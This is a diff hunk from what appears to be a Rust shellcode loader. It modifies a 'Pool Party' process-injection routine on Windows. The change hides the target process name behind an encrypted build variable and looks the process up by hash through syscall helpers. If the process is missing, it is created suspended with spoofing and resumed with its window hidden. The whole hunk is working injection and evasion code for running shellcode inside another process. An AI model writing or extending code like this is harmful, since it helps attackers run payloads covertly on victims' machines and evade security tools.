@@ -8,16 +8,20 @@ use obfstr::obfstr;
 use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};
 
 #[cfg(feature = "run_pool_party")]
-pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
+pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
     #[cfg(feature = "debug")]
     crate::utils::print_message("Executing via Pool Party...");
     
-    let pid = crate::utils::remote::get_process_id_by_name(target_program)?;
+    use crate::utils::simple_decrypt;
+    let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
+
+    let target_program_hash = crate::utils::dbj2_hash(target_program.to_lowercase().as_bytes());
+    let pid = crate::syscall::common::get_process_id_by_name(target_program_hash);
 
     let process_id = if let Some(existing_pid) = pid {
         existing_pid
     } else {
-        let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
+        let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;
         
         // Resume immediately with SW_HIDE
         crate::api::resume_thread(process_info.hThread)?;
